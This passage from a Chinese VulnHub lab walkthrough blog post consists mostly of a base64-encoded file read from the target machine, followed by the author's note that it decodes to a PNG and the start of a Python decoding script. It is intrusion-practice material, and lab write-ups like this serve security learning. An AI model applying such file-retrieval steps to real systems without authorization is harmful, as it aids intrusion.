class="line">uDEOOraeYb+tpaWlGV4qGAz+9Kc/3bRpkyOCKQpozE08d91116iv/9vf/tZvodJm2bJlra2tiR9r</span><br><span class="line">ugwODl5wwQUJbnr33XeP+pV///d/T0vs2267bdQV/vKXv2Q2EtlIfsyxzHFjHHRsPWPs25o527dv</span><br><span class="line">9/trKXmEKjc2P/jBD8YdgWeeecZv0dJg0aJFji86NhPpN7/61a/G/fwjjzySoti33377uFd47bXX</span><br><span class="line">nBsb/8mPOZY5boyDjq1nTPS2Zk57e7vfX07JF1S5sVi3bl2CQbj22mv9FjBV3nrrLUdXmzgGBwfH</span><br><span class="line">3nH9+vUJfuXSSy9NKvOqVasSXOErX/mKC+PkA3kzxzLEjXHQsfWMxG9r5jzwwAN+f0UlL1DlxuKR</span><br><span class="line">Rx5JMAhHjx71W8CU2LBhg6PrzDhs3Lhx1E2feuqpBJ9PxfTyhz/8IcEVrpDImQAAIABJREFUent7</span><br><span class="line">3Rktr8mPOZY5boyDjq1nJH5bHaGystLvb6nkPqrcWDQ1NSUeh3nz5vktY3JuvPFG51aY8Rl7rhoc</span><br><span class="line">HEz8K0njDffs2ZP4CqeeeqprY+Yd+THHMseNcdCx9Yykb2vmbNiwwe9vmatoKvj/JWk2zezZs72R</span><br><span class="line">xF+Srn0LFy70RpJMaG5udvsWfX19o/5PUt0l8w+UlZUlFSz7yY85ljlJx2HsHMv8mlNkbD2gtrY2</span><br><span class="line">D26Rr6hy839Yv3590s+cffbZHkjiL6kcFHJiHHbv3u32LTRdc3LkzRzLkKTjsG3btnSVGx1bz1iz</span><br><span class="line">Zo0HPqMPfOADbt9CyXNeeumlpBbCzs5Ov8V0ne3bt+fNODzxxBNOGIbHZ8+ePWPvmPS3kloHDx06</span><br><span class="line">lPgKq1atcme0vCOf5lgmJB2HxBUHJnfNKTK2HpA4wM5B1I2oTJ5bb701xXn2+9//3m9hXST1tMZc</span><br><span class="line">GQfHi9zYzJgxY+ztkv6WKjf5N8cmR9Jx+O53v+v4NafI2HrATTfdlOJQZ86hQ4f8/rpKDhIMBseW</span><br><span class="line">XEvM1q1b6+rq/BbcYcrLyx988MG8HIfEySOT4KWXXiouLh73Xkl/dyorN3k8x9Ii6TiEQqFPfepT</span><br><span class="line">zl5zioytBwSDwXvvvTetoc6cpqam1atX+/3Vc4yA3wL4w8aNG9evX79o0aKLLrpo7E/b2tqefPLJ</span><br><span class="line">Z599dvny5e95z3vGzU/ZvHnz/v3733jjjccee8yD8A43WLBgwYYNG9auXZv34zBnzpzzzjuvuLj4</span><br><span class="line">8ssvv/jiiydxhaeffvqhhx7q6+vbvHnzwYMHJ/pYLBZLfJ3p06d3dXUl+MChQ4cSJ+WdffbZO3bs</span><br><span class="line">SHyX7GHqzLHEpD4O9fX1KcZy6dh6xowZMzZs2HDBBRdMNNR9fX1//OMfn3/++aGhoQzvNWvWrEsu</span><br><span class="line">uWTdunVjf7R3794dO3Y0Nzf/7ne/y9d+LMrk2bhxY2Id+c477xz1K1dffXXiX3nwwQd9+S6ZcOed</span><br><span class="line">d07NcVi2bNnx48cTfxGTUCi0cuXKFC+e9GpTynIzZefYKCYxDm5cMy/H1gOSBi3cfffdjt80cTnQ</span><br><span class="line">WCz20ksvOX5TJYf59Kc/nXjG3HbbbeP+4sUXX5z4F5977jmPv0smJPXE5f04pB6Lk9Zlk15t6ig3</span><br><span class="line">OscsJj0Oblwzz8bWA5IqkXfddZdLt66rq0t8a+3PoPwfVq5cmXiuJNaFH3jggcS/ftNNN3n2XTIh</span><br><span class="line">cXX2KTIOZ555ZuJvYZFuukrSC04R5UbnmEWG4+DGNfNmbD0g6VCPmzLpINdee21iAbQZqgLwpz/9</span><br><span class="line">KfFEueSSSxL8etIujLmSYJk0QVrHwWISSQqJLxibMsqNzjGLDMfBjWvmzdh6QNJchFS6xWVI0qLn</span><br><span class="line">miiu0Nvbm3iWJK0FmdSXsXTpUm++SyboOFj86Ec/SvwtJhGCkPiCsSmj3Ogcs8h8HNy4Zn6MrQcc</span><br><span class="line">PXo08UClHo03aZJW0/FAwcpRplCF4qTVJJMWA036gWnTpqUnkx/oOFgcPnw48QcmUflesUiaM9LQ</span><br><span class="line">0JD4A/kxxzJ/19y4Zn6MrQckVRM9qEBTX1+f+ANTpOPhJJhCyo2iKN7w/PPPT/qnipINnHfeeYk/</span><br><span class="line">sGvXLg/OP48++mjiDySVc8qiyo2iKA7zjW98I8FPb731Vs8kUZTJ8a1vfSvxByaR5jYJHnvsscSV</span><br><span class="line">sS699FI13oyLKjeKojjMjh07JtJvvvOd72zevNljeRQlLW6++eZzzz03wQd++tOf/vGPf/RGmPPP</span><br><span class="line">Pz/xB5599llvJMktVLlRFMV5vvrVr1511VXhcNj8n9ddd90tt9zil0iKkgp333134uo1t9xyyzXX</span><br><span class="line">XOOZPLt27Vq8ePGuXbsm+kBdXV1TU9PatWs9EyknKPRbAEVJRHFx8ZVXXrl+/fpt27Y9/PDDjY2N</span><br><span class="line">fkuUM1RVVV155ZXr1q3btm3bL3/5y46Ojklc5GMf+9gFF1zw4osvPvnkk0eOHEnrd++///7777//</span><br><span class="line">kksuqa2ttWrGT0KAzLHGYe3atW1tbRle6o033pjEOChZjj1DSktLN27cOPYDDQ0Njz766ObNm0dG</span><br><span class="line">Rh599NFoNOqxhPX19Wecccbq1avPOuusNWvWLFmyZMOGDeYH5s2b9/LLL+/YsWP79u3btm177bXX</span><br><span class="line">tmzZ4rGQim8kTqiLTZk03Rwah7EVpSfRKnkibr755sTf4ic/+Um618yesb3ttttG/eLtt9+e1ne5</span><br><span class="line">4oorMh+QSePeOGRO6uOQ9FJJ54Mb18yPdcwpks6Qq6++2m8Zx2HJkiXHjh1LILb2Z5hC6KJgkSvj</span><br><span class="line">MNGi41QHnDxWbu66665xfzf1JjgTlUb9y1/+kuIVMsTVccicFMch6XVUufGXpDPkyiuv9FvGRCQu</span><br><span class="line">8dfb2+u3gIon6KJgkRPjsGrVqgTXd6RuVb4qN2vWrEnw66k0lEhcxPbaa69NY0Qmi9vjkDmpjEPS</span><br><span class="line">i6hy4yNJZ8jOnTv9ljEJGzZsSPwV/vSnP/kto29oQLGSjSTOJXavWV0e8PWvfz3BT7/zne8kvULi</span><br><span class="line">JtXf/OY305bJDxKPQ+bkyjgoE5F0hvzrv/6rN5JMmieffDJxJNlFF100ZetNq3KjZCNnnnlmgp8u</span><br><span class="line">Xbp01qxZngmTWyQu6rVmzZrCwiRpBCtWrEjw01mzZuXEcul2cbNcGQdlIpLOkG3btnkjSSbs2LEj</span><br><span class="line">8QembJU/VW7SIGlLOe055xRJC58vXLjQG0lyjqTl+ZN+IGn1/Zwozz8qC90NcmIclIlI+iI0Nzc7</span><br><span class="line">da/PfOYze/bsicVinZ2djzzyyIwZM5y6clIhk37NfEWVmzTYu3dvgp82Nzcn7QOipMK6deuSfmbZ</span><br><span class="line">smUeSKLkLtrkQckSXnvttR/84AennnoqUFNTc+mll7a3t09Zg4pnqHKTBl/60pcS/PSf//mfvRIk</span><br><span class="line">z7njjjuSfubb3/62B5IouYvbMTeKkgovvPDCuM3Dn3vuOXVruooqN2lQX19/3XXXjfujTZs23Xff</span><br><span class="line">fR7Lk5dcf/3169evT/qxRYsWpZ7YrExBXnnllVSipxXFPS655JIEbRx+85vfeCnMVEOVm/S47777</span><br><span class="line">LrvsslHu/Hvuuee9732vXyLlE7fffnvqKsv111//4IMPBoM6h5XxueWWW7Tbg+IjH/vYxxL8dPXq</span><br><span class="line">1UmDC5VJo+0X0uahhx566KGHPvCBD1RWVpaWlj766KMtLS1+C5XDXHHFFZWVlatXr7788svHjX17</span><br><span class="line">+OGH9+/fP2/evI0bN476wOWXX3755ZdbHzhw4MDDDz/c09PjleBKDvCd73zn+9///uWXX758+fKR</span><br><span class="line">kZHEH66trR07xxRl0iTt17148eKGhgZPZJlyqHIzSfxqlJNPXH311T/72c8SfOChhx76yEc+Yndy</span><br><span class="line">+cQnPvHNb37zn/7pn0Z9zG4H87Of/exb3/pW4tAoZaoxMjJy//33p/jhieaYokyCxYsXJ/7AnDlz</span><br><span class="line">vJFkCqImfcUfvvKVryTWbH74wx9edtllo3rUffnLX54o7MnitttuU0+2kglJ55iipMLatWuTVotO</span><br><span class="line">7LdSMkGVG8UH1q5dm7iP4969ez/72c+O+6P77rvvz3/+c4Lf/fCHP3zFFVdkJJ8ytUk6xxQlKb/4</span><br><span class="line">xS+Sfubiiy9es2aN+7JMRVS5UXwgqdn/85//fIKf3nrrrYl/XRPFlQxJOscUJQFPPPGEVdgmKVu3</span><br><span class="line">bk3xk0paqHKj+EDSAlZ79uxJ8NNdu3Z1dXUl+EBtbW3SUD5FSUDSOaYoYykvL/+Hf/iHpqamDRs2</span><br><span class="line">pP5be/bs+d73vqeFSZ1FlRvFB5K6opPuK4cOHXJOHEUZB1VulBS58sort27d2tnZ2d/f//jjj8+b</span><br><span class="line">N2/UBx5++OF3vOMd1dXVJ5544nXXXTe2N8iNN964b9++WCx29OjRBx54oLy83CvZ8xZVbpScJHGn</span><br><span class="line">i7a2Nm2FoSiKB2zduvWBBx5Ys2bNRGe2888//0Mf+tCWLVt6enqOHDly3333FRUV7dq1a9wP19bW</span><br><span class="line">Xnnllf39/Qmq/ympoMqNkpMkzve+6667PJNEUZQpy0svvZQ4Ivi9733vuG3OzjjjjMQ9L1944QWN</span><br><span class="line">xckEVW6UnGTv3r1f/OIXx/3R5s2bte6+oihuc9FFFyXu8vvYY49t2rRpop++733vS3z9Bx98cJKS</span><br><span class="line">KarcKLnLv/zLv9xwww2j/udDDz10zjnn+CKPoihTiptuuinxB37+858n+OmWLVsSG29WrVqlxptJ</span><br><span class="line">o8qNksPcc889JSUln/zkJ7///e9/8pOfPOWUUy677DK/hVIUZUpw8sknJ/7AkSNHEn/grbfeyvAW</span><br><span class="line">ykRo+wUltxkZGUl8PFIURVGmGmq5URRFURQlr1DlRlEURVGUvEKVG0VRFEVR8gpVbhRFURRFySum</span><br><span class="line">kHLT19eX+AOVlZXeSKJMWZLOMZ2EFknHobe3120ZkjYJ8UCGsWS+jmXD2CqK20wh5Wbbtm2JP6Ct</span><br><span class="line">5xW3STzHamtrZ82a5ZkwWUvScejr69u/f7+rMixdujSxcuOBDOOS4TqWDWOrKB4whZSbO+64I/EH</span><br><span class="line">br31Vm8kUaYsiefYF77wBc8kyWaSjsO//du/uS3DnXfe6bsM45LhOpYNY6soHjCFlJu//vWvDz30</span><br><span class="line">UIIPrF279tprr/VMHmUKkmCOnXvuuTfeeKPH8mQhScdh9+7dX/3qV12V4dprr924caO/MkxEJutY</span><br><span class="line">NoytonjDFFJugMsuu+yee+5J8IF777335ptv9kweZQoy7hy79NJLX3jhBV/kySqSjsOmTZtOP/10</span><br><span class="line">V2X42te+du+99/orQ2Imt45lw9gqimdMuQrFN9xww/e+972PfvSjCxYsWLRo0fr160d94K677rrh</span><br><span class="line">hht+/etf79u3r76+/tlnn/VFTiWPMedYeXn5xz/+8akc77V69eqlS5fOmDFjonHYsWPH/v37e3p6</span><br><span class="line">fvrTn27ZssUNGZYtW7Zq1aply5Zdc801tbW1Yz+wf//+HTt2uCpDWqS1jiWYYx6MraIoPjBnzpwn</span><br><span class="line">nngiNjGdnZ2XXHKJ32I6SYIva5E0SeTQoUOJr7Bq1Sq3Zcicm2++ObEMP/nJT9K9ZtLvlTkejG3m</span><br><span class="line">zzdFVq1a9dZbbyW40b59+0477TRH7jURVVVVW7duTSBDKBS64IILJnfxpM9i5cqVjnyLpOvY/9/e</span><br><span class="line">/cdUVf8PHL/7hMQcsTtTBAIlfolsyJShIt1MGZopc6ZzNd1qyx9h0820NStqc42mpjN/Ui1Ls2W5</span><br><span class="line">1GERaohC+QMNDCo0EBTIS0JBg8WdUHz/oC8acN/ncO6973PvOc/Hn9z3fZ/XeZ9z3vfFOe/zfuvS</span><br><span class="line">tl5OsYkkXCnFxcXiGjIzM8U1HDhwQFzD6tWrh9YuRmGux1ID3b59e9asWYJ7vFar9dixYxs2bJAZ</span><br><span class="line">FWB4mZmZZWVlMTExzgqUlJSMGzfu559/9lwMkZGRf/75p+C2WUtLy7Bhwzx3+3bmzJluqUexH+tH</span><br><span class="line">QtsC+jJ7ctNr1apV5eXlggI5OTnJycnS4gGMbeTIkXl5eYIC3d3djz76qKfDUFyTefz48R4NYPv2</span><br><span class="line">7W6sTbEf6yWnbQF9kdz8S3Ec8c6dO+VEAhjejh07xAVeeeUVT8ewbds2Pz/RoMMtW7a0tLR4Ooyq</span><br><span class="line">qio31qbmfQgJbQvojuTmX4WFheICqampzB4LuIXiAOozZ854OgbF0QyHDx/2dAwWiyU+Pr61tTUj</span><br><span class="line">I8MttSn2YxYpbQvojuTmrsbGRnGBhx9+WE4kgLFFRkaKC9TV1Xk6BsXJoJubmz0dQy+r1do7HLi6</span><br><span class="line">uvrkyZMuvsHQ3d0tLuBwOFypH/AJJDd3KT6ujoqKkhMJYGDx8fHi50FNTU0Sngd5oZiYmIyMjGPH</span><br><span class="line">jl2/fl1bDYpta6EfgzmQ3Ny1ZcsWcYF169bJiQQwsBdffFFcQHFEjuFFRUXZ7XYNX1RsWwv9GMyB</span><br><span class="line">5OaukpKSTz75RFDAZrO98MIL0uIBjMdmsy1fvlxQoLKy8q233pIWj9cKCQnZvHnzkL6i2LZ9xejH</span><br><span class="line">YHgkN/+xdOnS999/X1Bg165d/N8DaJOZmVlcXCwoUFRUNGHCBGnxeLmsrCz1hRXb9l70YzA80y2/</span><br><span class="line">oGjFihW7d+/OysoKDg6OjIwcOMXk22+/vWzZstzc3MbGxhs3bnz//fe6xAlfV1NTU11dHRIS4q4J</span><br><span class="line">f71TQkJCREREUFDQ6tWrbTbbwAK97fDXX3/t3btXzcs+5hEYGBgeHi540UFl2w56jtGPAaY2ZsyY</span><br><span class="line">M2fOCCa3bmhomD17tt5hDoF4ru4ell/4f55bfqGiouLeOSEVz7F7+dDyC0lJSRUVFerbQbLW1lbx</span><br><span class="line">biq+0qVI8VgocjY6eKhta7x+zHWKjc/yCz6Nx1IK6uvrH3vsMcEMfuHh4QUFBdnZ2TKjgu/qffJy</span><br><span class="line">7z/KiueYL1qwYMGVK1cEaycNbAf0U1RUNOh73Rraln4MZkNyo8qaNWsuXbokKLBx48bU1FRp8cBH</span><br><span class="line">dXR0OFtOSPEc8yHh4eFHjhwRFBC0A/oMOt2wK21LPwbzILlRS3H83bvvvisnEviuNWvWCD41zBjP</span><br><span class="line">Xbt2iQuI2wEWi2XZsmWD3tZysW3px2ASJDdqlZSUdHR0CAokJiaGh4dLiwe+qKSkRPyp+BzzFWlp</span><br><span class="line">aeIC4nYwufLy8smTJ3/wwQeDfupi29KPwSRIboZAcdbUUaNGyYkEPkrxFDLGzLyKKxsYYzfdqKio</span><br><span class="line">aN68eY888shDDz00adIkwcMj19uWfgxmwKvgAKCnp5566rPPPtM7CsBQSG4AQDdPPvnk0aNH9Y4C</span><br><span class="line">MBoeSwGAPgoLC8lsAE8guQEAfWzatEnvEABjMuljqbCwsIiICLvdXl9fr3csAEyqsrJS7xAAYzLd</span><br><span class="line">nZu4uLjS0tJff/31woULN2/eLC0tTUpK0jsoAGbkcDj0DgHa2e12cYGQkBBxgdDQUBdrUCxgWuZK</span><br><span class="line">bmbMmHHt2rWUlJS+v6SkpFy5cmXOnDk6RgUA8DmnT58WF5g/f77g08jIyJiYGHENir9NGRkZ4gKm</span><br><span class="line">ZaLkZuTIkc7Oxfz8fNcXyQMAmMdrr70mLrBy5crAwEBnn+7YsUNxEwsWLBAkQDk5OYo1mJaJkps9</span><br><span class="line">e/YIPtWwBDQAwMwmT54sLuBsadjVq1crrvjdy9mMjvPnz9+wYYOaGszJRMmNzWYTfDpjxgxpkQAA</span><br><span class="line">DODSpUtjx469ePGiswJxcXF2u33KlCl9fwkODj506JCa2za9rFZrT0/P7Nmz+/4yfPjw7du3Hzt2</span><br><span class="line">THPYZmCit6XEA6/8/PysVmtbW5u0eADoKCAgQFyA0b5Qo76+furUqWFhYbGxsUFBQVlZWf0GyoSE</span><br><span class="line">hFy4cKGpqamqqspqtU6cOFHDVgoKCjo6OsrLywMCAu4dNgpnTJTcAECv8PBwcXLT0dHR1NQkLR74</span><br><span class="line">ulu3bt26dctisRw/fjw1NfXcuXP9CoSEhLj4ZlNgYKD4+QPuZaLHUgDQa8WKFeICH374oZxIYDzn</span><br><span class="line">z58fO3as3lGYHckNAHMZM2ZMdna2oMAff/yxZs0aafHAeOrr69evX693FKZGcgPARBITE2/evCko</span><br><span class="line">UFtb++CDD0qLB0b1zjvv6B2CqZHcADC4oKCghISEuXPn5ufnV1RUDCzgcDgqKyuPHz8+b9686Oho</span><br><span class="line">+RHCeLq7u69evap3FObFgGIAhhUWFvb555+npaU5K9DW1rZo0aLCwkKZUcEk6urq4uPj9Y3BtOPi</span><br><span class="line">SW4AGFNKSkppaamgQE1NTWxsrLR4YDZff/217mv7nDp1St8A9MJjKQAGFBgYKM5sLBYLmQ08aufO</span><br><span class="line">nfrOlrR3717TTt5GcgPAgHJzc8UFeJkFEkybNk2vTV+6dGnVqlV6bV13JDcADCg9PV1c4KuvvpIT</span><br><span class="line">CcysvLw8Ojr6/Pnzkre7adMmxXWvjI0xNwAMSHE2WNMOtEQvh8MhnqVacYEOlWpra6dNmxYVFTV+</span><br><span class="line">/Hh31SnQ1tbGAHkLyQ0AwISqq6sTExMFBWJjY92YAdfW1tbW1rqrNijisRQAwHT2798vLrBy5Uo5</span><br><span class="line">kcATSG4AAKazdetW8a2UJUuWaFvBG96A5AYAYEbR0dG//PKLoEBZWVlycrK0eOBGJDcAAJMaN27c</span><br><span class="line">okWLioqKampquru7Bxa4fPnyl19+OXv27KioqP/9j19Mn8GhAgCY1xdffDFz5szY2Nhhw4Y9/vjj</span><br><span class="line">LS0t/QrMnTu3oKDg+vXrf//995kzZ8aMGaNLnBgSkhsAACwWi+XEiROjRo2qrKx0VmD69Ok3b960</span><br><span class="line">2Wwyo4IGJDcAANw1YcIE8aoFxcXFkZGRssKBFiQ3AAD8x7PPPisu8NFHH8mIA1qR3AAA8B8nTpwQ</span><br><span class="line">F5g+fbqfH7Pgei8TJTeDjoS/l+KZqlhAcRPegHYwNgnH13Xe8KvgDTFowPUrh8PhUJyemCdT3sxE</span><br><span class="line">yU1NTY24QGxsrOBTPz+/8PBwcQ3V1dVDDks62sHYJBxf14ljkMMbYtCA61eaixcviguEhobKiQQa</span><br><span class="line">mCi5OXTokLjAM888I/h0wYIF4q+fOnXK4XAMOSzpaAdj8/TxdQtxDHJ4QwwacP1K8/zzz4sLzJkz</span><br><span class="line">R04kgILffvutR0hwm1H8xZ6eHqvVKnFXXKJ7O3hDY7700kviGN57772h1un6ftXV1YlrUDMfvEeP</span><br><span class="line">r5oY1FTi6Vv6PhGDtvNc9+vXPLKyssTNpXeAcMpEd24sFsvo0aPFj1Hr6uoG9gv+/v6///67uObo</span><br><span class="line">6Gjxq4NehXYwNs8dXzcaNAbJvCEGDbh+pdm7d+/rr78uKPDTTz+NGDFCWjyAyNq1a8vKypqbm50l</span><br><span class="line">47m5uVOmTBkxYkRCQkJ2drazYp2dnVVVVZs3b9Z7hzTSsR3E/wz1cOfGOfUr+bnr+GqIQX1VfTEE</span><br><span class="line">KVG5174Vgyvnuff0Y8OHD9f8XZ+QlpZ2+vRpu93urA1fffXV9PT04OBgxVPIdXo3BnyBv7//kiVL</span><br><span class="line">urq6FPugfl5++eXg4GC9w3cb+e2gWDPJjTMalinWfHw1x+CuDd2rq6srPz9f/fnmEzG45TzXsR/b</span><br><span class="line">t29fe3t7T09PZ2fngQMHDL/0kr+///z581tbW7WcPe5z8uTJpKQkvRsDvkCQkg9kpLSmH2ntoFg5</span><br><span class="line">yY0zGpKbPkM6vq7E4JatOKNy5nufiMG957nMfsxqtQ5abUhIiLt2x5tVVFSob2oPWblypd7N4NUM</span><br><span class="line">nmirFBoaqnJqh7Fjx96+fdvT8eiFdjA29cfXmxUXF8fExBDDQDKv3+bm5kH/brfbfXQCoSGZMGHC</span><br><span class="line">wPU1JcvNzU1PT9c3Bm9GcvMvxcm2LRbLp59+Wl9f7/lY9EQ7GJua4+v9Dhw4oHcIXhHDQHKu323b</span><br><span class="line">tgkymH379rlSua9YunSp3iFYDh48qHcI8HoBAQGKtwHNsBKsnHZQ3ASPpZxx5bGURd3xVaTvY6le</span><br><span class="line">I0eONEAMbj/P5Vy/DQ0Ngvo7Ozvdsi/ez43j2DSbMWOG3s3gpbhz8y+Hw6H4DmRDQ4OcYHTkcDgU</span><br><span class="line">b7fW1dW5uBXFm+cSnp54IgbX6/R0y6g5vq6TcPgUJ4f1iRjcHqSc61c8sCYgICAwMNDFTfiEGzdu</span><br><span class="line">6B2CwrEwM5Ib9KeYwzU2Nrq4CXENHR0dHR0dLm7CxRgsKiZfH0jc2anZL8XGd/2XSUKO7voZokjC</span><br><span class="line">WerpGDx0npvk+vUG3vDvroTz3EeR3KC/jz/+WPDp8ePHXd/E4cOHNX/qLopbKSwsHGqd4kfgavZr</span><br><span class="line">9+7dgk9PnTrl+s+G+Pi6haeP4Hfffad4n9X7Y/BQhCa5fr2B+GqVoLGxsaSkRN8Y4AMUZy/wxclM</span><br><span class="line">tRG8U+quG86902MMyi31q7F8+XJnMeTk5GirUzA1vsoarl275qwGdw3RcPGdcDXjfgTH13Uql/b0</span><br><span class="line">8hjUfF0bk1y/3kBwtUqQlpamdwPAF5Dc3GvQH+moqCh31R8QEDCwf+zq6pK8tM3GjRsH7uaePXtc</span><br><span class="line">qXPgT8tQ9+v69esebXyLivWJBNQkN4MeX7dISUlRuY9eG4OE89wk1683GPRqlcBHV36FDkhu+nnj</span><br><span class="line">jTeqqqq6uroaGhree+89T0w/unnz5rq6ut5NbNu2ze31qzFx4sQjR440Nze3t7efPHkyNTXV9Trf</span><br><span class="line">fPNNF/dr3bp1FRUVnZ2ddrvdQ+/W9h3fofaq6t/Y6ju+Wjvwu+x2+8GDBzXM9O9VMcg8z01y/XqD</span><br><span class="line">vqvV9XNMUXNzc0FBgXv/1YHBkdzAnIKDgwVP6AZy8XV0AIA8JDcwOfH8JSQ3AHwFb0sB+FdERIQB</span><br><span class="line">1mcAAJIbAHctXrxY7xAAwFUkNwDuOnr0qN4hAICrjL98q5dISEiw2Wze8J5kd3f3jz/+eOLECb0D</span><br><span class="line">gZe6ceMGw8vgIfSEgGxlZWXicZSaa/7222/VvogiS11dXUJCghtbD4bh6cU7YVr0hIAO1q5dK7gG</span><br><span class="line">8vLytFUr7SrVYPr06e5tQxgAyQ08QUqXphE9IQzO7dOWl5aWyrxENXB7G8LXkdzA7egJIRkDiv8j</span><br><span class="line">NDT09u3bA/8eHR2tYcHC1NRU9dO062Xt2rV6hwDAyOgJIR/JTX+jR4/eunVrU1OTxWLp6Og4fPjw</span><br><span class="line">fffdV1tbq6Eqn5ghOyMjQ+8QABgZPSHkI7kZxPr160NDQ++///4HHnhg8eLF//zzj7Z6/P393RsY</span><br><span class="line">oF5GRsa5c+daW1urq6s3bNigdzgwL3pCyEdy49SdO3dcrOHq1atuicSjzp49q3cIcL+8vLzeRUCt</span><br><span class="line">VmtMTExOTk5rayu/MdAFPSFgNJcvX9Z7nJwCPz/mOjKa4uLiQY91V1eXmq8zoBhuR08Iybhz41lT</span><br><span class="line">p07VOwSRWbNmsZaQwTz33HM2m23Qj/z8/Pbs2SM5HsBCTwgYj7+/v+L0gPK1t7enpaXp3TZwv6qq</span><br><span class="line">KvFxV6yBOzfwBHpCyMSNOI+7c+fOpEmT0tPTlyxZ4nA49A7H4nA4fvjhh/379+sdCDwiPj5e8Glg</span><br><span class="line">YKDVam1ra5MWD9CLnhAAoJHiv6qKy/pw5waAr2PMDQAAMBSSGwAAYCgkNwAAwFBIbgAAgKGQ3AAA</span><br><span class="line">AEMhuQEAAIZCcgMAAAyF5AYAABgKyQ0AADAUkhsAAGAoJDeAoTQdSUSlAAABo0lEQVQ2NooLRERE</span><br><span class="line">iAuEh4eLCzQ0NAwtJgCQi+QGMJTCwkJxgSeeeELwqc1m8/MTradbUlLS0tKiJTIAAAAN/Pz8FNfO</span><br><span class="line">DAgIcPZ1Vs0EAABeJzExUZygOHuulJ+fL/7i008/LXlfAAAALBaLJSgo6PTp04I0paura/bs2X3l</span><br><span class="line">U1JSqqurBeWLi4sTEhJ03CMAAADL8OHD4+Li0tPT8/LynKU4VVVVra2tg36al5e3cOHC5OTkESNG</span><br><span class="line">6L0rAAAA/xUTEyN+5NTP3Llz9Q4ZAABAKDg4WGVmk5GRoXewAAAAKmRnZytmNt98843eYQIAAKgT</span><br><span class="line">EhKimNxkZmbqHSYAAIBq7e3t4uQmJiZG7xgBAABUq6ioECc34hmKAcD7sfwCYC7iITVnz57t7u6W</span><br><span class="line">FgwAAIAbCG7bxMfH6x0dAADAEMXFxQ2a2SxcuFDv0AAAADQJCgoqLi7uS2tKS0uTkpL0DgoAAMA1</span><br><span class="line">QUFBycnJYWFhegcCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAACg0f8BeD+YFbp5dlYAAAAASUVORK5CYII=</span><br></pre></td></tr></table></figure>

<p>成功读取该文件，将内容复制后，尝试base64解密，，发现是png的文件头如下图：</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub47.jpg"></p>
<p>使用python脚本将该base64字符串转换为png图片，脚本如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import os,base64 </span><br><span class="line">strs=<span class="string">&#x27;&#x27;</span><span class="string">&#x27;iVBORw0KGgoAAAANSUhEUgAAAvQAAAFYCAIAAACziP9JAAAACXBIWXMAAAsTAAALEwEAmpwYAAAg</span></span><br><span class="line"><span class="string">AElEQVR4nOy9eZhdVZXw/bu35iFVlXmgUiQhBAIJEGKMAQGDb1rpbj5EjYK8KIoy+SniIyC2Q4uC</span></span><br><span class="line"><span class="string">Nn5tOzI4dAvaKI2CLTgEWmYIGTCBQAbIUEkqVZWa5+lO3x/nXefdt4Y71D3DvbfW78nDk1C3zll3</span></span><br><span class="line"><span class="string">n332XnuNoCiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiK</span></span><br><span class="line"><span class="string">oiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiK</span></span><br><span class="line"><span class="string">oiiKovhOwG8BlNynAM6AEYhCBGLQCd0Q8lswRVEUZUoS9FsAJfcphUIIQBAKICBajqIoiqL4gSo3</span></span><br><span class="line"><span class="string">SsYUi1oTlAkVgajPQimKoihTFlVulIyJicHG+m9MzTaKoiiKn6hyoziBpdlguKUURVEUxScK/RZA</span></span><br><span class="line"><span class="string">yX3C4pMCIhDQOHVFURTFT1S5UTLGUm4K5J8FiT6rKIqiKG6jyo2SMSEjlDgGQbXcKIqiKH6iMTdK</span></span><br><span class="line"><span class="string">xtiuqCAUQolOK0VRFMVP1HKjOEEYCiFqZE4piqIoik+ocqM4QRSKxD+FTitFUZQpSTVUwwC0+SyI</span></span><br><span class="line"><span class="string">7kKKE1jKjZ0BHpCCN4qiKMoU4V1QI6XOmmG7n7JocITiBCPSgSEgmVPqmXKPAqjyWwZFURSTpTAT</span></span><br><span class="line"><span class="string">QjAMEZgJ50OJb+Ko5UZxgigUymyyyhOrcuMSy+BtEIIheA66/ZZHURQFKIQwEF+w/nx4HZp8EEct</span></span><br><span class="line"><span class="string">N4oThKBIOkxZdW7UJ+UGNbAWwjAEUTjVb3kURVEs2oy0WWsjKIISWAnLfRBHlRvFIezG4EFJm1Ic</span></span><br><span class="line"><span class="string">52yIwYgsH8A0nyVSFEUBaIM2iEipM7M4yImwymtxVLlRnKBYVHVr042pcuMOsyASP9RFfoukKIpi</span></span><br><span class="line"><span class="string">8QIchg4IAVAIBaLfzIFTPJVFY24UJyg2bAmq1rhEAUyDXgiK+hjVHqWKomQTu6ECZkMdVEOpxN8E</span></span><br><span class="line"><span class="string">4UTog2MeCaLKjeIEJVBodGDQaGI3KDbsvZYGOSwRfIqiKFlCP/RDE6yAeVABMSiEclgC7TDkhRTq</span></span><br><span class="line"><span class="string">llKcoAIwfCU6rdzA9kZZwxuAATH/KoqiZBXD8AocgRE5khVDNSz06P66CylOUGpEE+uccgkrxz4o</span></span><br><span class="line"><span class="string">Zt4wjMCwz0IpiqJMyC7oACQzvBzmQLkXd9aNSHGCMqN8n1bwc4mQ4ZYKwCAM+C2SoihKYrbG13ed</span></span><br><span class="line"><span class="string">BfO8uK0qN4pzBI30P8VxwkYBiSCMwIjfIimKoiRmCA4Ydv0yqIZi12+ryo3iBANGwE1AtBzFccKS</span></span><br><span class="line"><span class="string">XVkgdfwURVGynF1QYewRNV40kFHlRnGCIWm/YAcUq3LjBsNGDy80mlhRlFxgGHqgSM5ms7wIu1Hl</span></span><br><span class="line"><span class="string">RnGCXtFs7D+q3LhBvzHOeGHaVRRFcYAWKJPTb4kk2LqJKjeKE7RKFRbTeKM4zhCUGH1b1C2lKEpO</span></span><br><span class="line"><span class="string">0AiVRuepQih194a6BSlOEJNNNyj+KbXcuMEgFMkCUaKB24qi5AhVUGq0ICyRivauoauj4gQh8ZVY</span></span><br><span class="line"><span class="string">jaXULeUSMbGQRaHM9dVBURTFGQqM0y8Sf+MmarlRnGDYqHCj2VLuERWLbhCmQYnf8iiKoqRCiRGO</span></span><br><span class="line"><span 